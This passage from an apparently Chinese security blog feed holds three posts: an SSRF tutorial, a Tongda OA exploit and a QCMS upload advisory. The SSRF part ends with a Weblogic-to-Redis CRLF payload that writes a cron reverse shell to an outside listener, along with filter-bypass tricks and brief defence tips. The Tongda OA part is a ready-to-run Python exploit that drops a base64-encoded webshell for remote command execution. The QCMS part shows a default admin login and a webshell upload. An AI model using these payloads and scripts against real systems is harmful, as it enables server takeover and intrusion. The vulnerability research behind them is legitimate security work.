class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>http/https协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;ip:port</span><br></pre></td></tr></table></figure><h1 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h1><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><ul><li>如果内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，可以直接反弹shell获取权限</li><li>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</li><li>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</li></ul><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><h3 id="参考vulhub的漏洞环境搭建"><a href="#参考vulhub的漏洞环境搭建" class="headerlink" title="参考vulhub的漏洞环境搭建"></a>参考vulhub的漏洞环境搭建</h3><p>装个docker方便的很</p><p>docker-compose.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: vulhub&#x2F;weblogic</span><br><span class="line">   depends_on:</span><br><span class="line">    - redis</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;7001:7001&quot;</span><br><span class="line"> redis:</span><br><span class="line">   build: .</span><br></pre></td></tr></table></figure><p>编译及启动测试环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p><h3 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h3><p>SSRF漏洞存在于</p><p><code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p>1.比如探测自己的 7001端口，这是存在的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020032210495411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317214058386.png&quot; alt=&quot;image-20200317214058386&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><p>2.比如这个 探测 172.19.0.2:6379是否开放，这种报错就是开放的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322105012614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317211339515.png&quot; alt=&quot;image-20200317211339515&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><p>2.比如这个 探测 127.0.0.1:7000是否开放，这种报错就是不存在的端口</p><p><img src="https://img-blog.csdnimg.cn/20200322105029385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317213926045.png&quot; alt=&quot;image-20200317213926045&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><h3 id="攻击redis（通过header-CRLF-注入）"><a href="#攻击redis（通过header-CRLF-注入）" class="headerlink" title="攻击redis（通过header CRLF 注入）"></a><strong>攻击redis（通过header CRLF 注入）</strong></h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><h4 id="查看docker-redis的ip地址"><a href="#查看docker-redis的ip地址" class="headerlink" title="查看docker redis的ip地址"></a><strong>查看docker redis的ip地址</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker exec -it c5e88c76db40 ip addr</span><br><span class="line"></span><br><span class="line">172.19.0.2是docker redis的内网地址</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200322105119457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A7ZX0fPU-1584844899988)(/Users/zy/Library/Application Support/typora-user-images/image-20200317210632447.png)\]"></p><h4 id="利用SSRF漏洞探测内网redis是否开放"><a href="#利用SSRF漏洞探测内网redis是否开放" class="headerlink" title="利用SSRF漏洞探测内网redis是否开放"></a>利用SSRF漏洞探测内网redis是否开放</h4><p>发现redis存在</p><p><img src="https://img-blog.csdnimg.cn/20200322105157613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-AK6eRaxz-1584844899989)(/Users/zy/Library/Application Support/typora-user-images/image-20200317211405238.png)\]"></p><h4 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h4><p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p><p>写成计划任务，然后反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.0.1&#x2F;21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p>进行url编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>注意，换行符是“\r\n”，也就是“%0D%0A”。</p><h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a><strong>实施攻击</strong></h4><p>本机监听端口：nc -lvvp 2333 </p><p>注意IP要填对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp 这个肯定是weblogic的能访问的地方了</span><br><span class="line"></span><br><span class="line">operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;  这个是redis的IP和端口</span><br><span class="line"></span><br><span class="line">最后一个ip</span><br><span class="line">192.168.0.100%2F2333  这个是要反弹shell的主机ip和端口</span><br></pre></td></tr></table></figure><p>浏览器访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.100%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>反弹shell成功！<br><img src="https://img-blog.csdnimg.cn/20200322105240681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x06-绕过技术"><a href="#0x06-绕过技术" class="headerlink" title="0x06 绕过技术"></a>0x06 绕过技术</h1><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><p><strong>1.@</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc@127.0.0.1</span><br><span class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</span><br><span class="line">http:&#x2F;&#x2F;8.8.8.8@127.0.0.1:8080、http:&#x2F;&#x2F;127.0.0.1#8.8.8.8</span><br></pre></td></tr></table></figure><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br>在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com，而`libcur`l则识别为www.bbb.com" target="_blank" rel="noopener">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br><strong>2.利用[::]</strong><br>可以利用<code>[::]</code>来绕过localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>3.利用短网址</strong></p><p>站长工具短网址(<a href="http://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/dwz.aspx</a>)<br>跳转要去的地址</p><p><strong>4.利用特殊域名</strong><br>原理是DNS解析。xip.io可以指向任意域名，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>5.利用DNS解析</strong></p><p>在域名上设置A记录，指向127.0.0.1</p><p><strong>6.302跳转</strong></p><p>使用302跳转地址</p><p><strong>7.利用进制转换</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure><p><strong>8.句号</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h4 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h4><p><strong>1.限制为<a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名</strong><br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br><strong>2.限制请求IP不为内网地址</strong><br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br><strong>3.限制请求只为http协议</strong><br>（1）采取302跳转<br>（2）采取短地址</p><h1 id="0x07-审计php常见的函数"><a href="#0x07-审计php常见的函数" class="headerlink" title="0x07 审计php常见的函数"></a>0x07 审计php常见的函数</h1><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><p>（1）file_get_contents() 函数从用户指定的url获取内容，并展示给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（2）fsockopen()</p><p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) &#123; </span><br><span class="line">    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);   </span><br><span class="line">    if (!$fp) &#123; </span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Host: $host\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;\r\n&quot;; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents&#x3D;&#39;&#39;; </span><br><span class="line">        while (!feof($fp)) &#123; </span><br><span class="line">            $contents.&#x3D; fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（3）curl_exec() 函数用于执行指定的cURL会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#39;url&#39;]))&#123;</span><br><span class="line">    $link &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">    $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项</span><br><span class="line">    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器</span><br><span class="line">    curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="0x08防御技术"><a href="#0x08防御技术" class="headerlink" title="0x08防御技术"></a>0x08防御技术</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br>2、统一错误信息，防止根据错误信息判断端口状态<br>3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br>4、设置URL白名单或者限制内网IP</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2115#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115#toc-2</a></p><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA前台RCE加EXP任意文件上传+文件包含</title>
      <link href="/2020/03/18/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0RCE%E5%8A%A0EXP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/03/18/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0RCE%E5%8A%A0EXP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>RCE思路如下：未授权上传文件（jpg）-&gt;php代码包含-&gt;rce<br>理论上是通杀，但是貌似2015版没有包含功能<br>大家可以复现了</p><p><img src="https://img-blog.csdnimg.cn/20200318165233465.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义webshell，因为是包含，所以用写入马比较方便</span></span><br><span class="line"><span class="comment"># 这个马自带bypass disable_function 功能</span></span><br><span class="line">shell = <span class="string">'''&lt;?php</span></span><br><span class="line"><span class="string">$fp = fopen('poc.php', 'w+');</span></span><br><span class="line"><span class="string">$a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==");</span></span><br><span class="line"><span class="string">fwrite($fp, urldecode($a));</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入目标</span></span><br><span class="line">url = input(<span class="string">"input the TARGET(example:[url]https://127.0.0.1:1080[/url])&gt;"</span>)</span><br><span class="line"><span class="comment"># 定义上传目录和包含目录</span></span><br><span class="line">upload_url = url+<span class="string">"/ispirit/im/upload.php"</span></span><br><span class="line">include_url = url+<span class="string">"/ispirit/interface/gateway.php"</span></span><br><span class="line"><span class="comment"># 定义shell目录，如果要修改名字，需要把shell里面的一起改了</span></span><br><span class="line">shell_url = url+<span class="string">"/ispirit/interface/poc.php"</span></span><br><span class="line">files = &#123;<span class="string">'ATTACHMENT'</span>: shell&#125;</span><br><span class="line"><span class="comment"># 参见源码，有漏洞的版本只要POST P和DEST_UID参数就会自动生成session</span></span><br><span class="line">upload_data = &#123;<span class="string">"P"</span>: <span class="string">"123"</span>, <span class="string">"DEST_UID"</span>: <span class="string">"1"</span>, <span class="string">"UPLOAD_MODE"</span>: <span class="string">"2"</span>&#125;</span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line">upload_res = requests.post(upload_url, upload_data, files=files)</span><br><span class="line"><span class="comment"># 此时会返回上传文件的路径</span></span><br><span class="line">path = upload_res.text</span><br><span class="line"><span class="comment"># 解析返回值获取上传地址</span></span><br><span class="line">path = path[path.find(<span class="string">'@'</span>)+<span class="number">1</span>:path.rfind(<span class="string">'|'</span>)</span><br><span class="line">            ].replace(<span class="string">"_"</span>, <span class="string">"\/"</span>).replace(<span class="string">"|"</span>, <span class="string">"."</span>)</span><br><span class="line"><span class="comment"># 由于上传文件会自动改为jpg，所以要用gateway.php包含</span></span><br><span class="line">include_data = &#123;<span class="string">"json"</span>: <span class="string">"&#123;\"url\":\"/general/../../attach/im/"</span> + path+<span class="string">"\"&#125;"</span>&#125;</span><br><span class="line"><span class="comment"># 包含+自动写入shell</span></span><br><span class="line">include_res = requests.post(include_url, data=include_data)</span><br><span class="line"><span class="comment"># 返回结果 a参数可以直接填入系统命令（比如whoami），默认是system权限</span></span><br><span class="line">print(<span class="string">'shell is here:'</span>+shell_url+<span class="string">'?a=command'</span>)</span><br></pre></td></tr></table></figure><p>转自：<a href="https://www.t00ls.net/thread-55458-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55458-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QCMS v3.01 has Unrestricted Upload vulnerability</title>
      <link href="/2020/03/16/QCMS%20v3.01%20has%20Unrestricted%20Upload%20vulnerability/"/>
      <url>/2020/03/16/QCMS%20v3.01%20has%20Unrestricted%20Upload%20vulnerability/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>– Title: QCMS v3.01 has Unrestricted Upload vulnerability</p><p>– Date: 2020-01-28<br>– Exploit Author: zeo<br>– Official download address of QCMS: <a href="http://www.q-cms.cn/" target="_blank" rel="noopener">http://www.q-cms.cn/</a><br>– The latest version I tested should be version 3.0.1 according to the official website description<br>– Version: v3.01<br>– Tested on Windows 7</p><p>– QCMS v3.01 allows Unrestricted Upload of a File with a Dangerous Types to /backend/system.php</p><p>– The vulnerable code is located in</p><p>Lib-&gt;Config-&gt;Controllers.php-&gt;public function upload($file_arr = array()){<br><img src="https://img-blog.csdnimg.cn/20200316220247224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Not to upload types for effective detection, lead to upload any file, can be directly getshell</p><p>– Proof of  Unrestricted Upload:</p><p>1.login QCMS<br>The default  user and password：admin admin<br><a href="http://127.0.0.1/admin/" target="_blank" rel="noopener">http://127.0.0.1/admin/</a><br><img src="https://img-blog.csdnimg.cn/20200316215743363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 Visit vulnerability url <a href="http://127.0.0.1/backend/system.php" target="_blank" rel="noopener">http://127.0.0.1/backend/system.php</a><br>Click on the upload，Can upload webshell directly<br><img src="https://img-blog.csdnimg.cn/20200316220607942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 Copy the reflection upload address, visit<br><a href="http://127.0.0.1//Static/upload/source/20200316/3415e6f41aae98939.php" target="_blank" rel="noopener">http://127.0.0.1//Static/upload/source/20200316/3415e6f41aae98939.php</a></p><p><img src="https://img-blog.csdnimg.cn/20200316220749583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>successful<br><img src="https://img-blog.csdnimg.cn/2020031622092694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 申请 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用</title>
      <link href="/2020/03/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%BA%8C-Beacon%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/03/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%BA%8C-Beacon%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
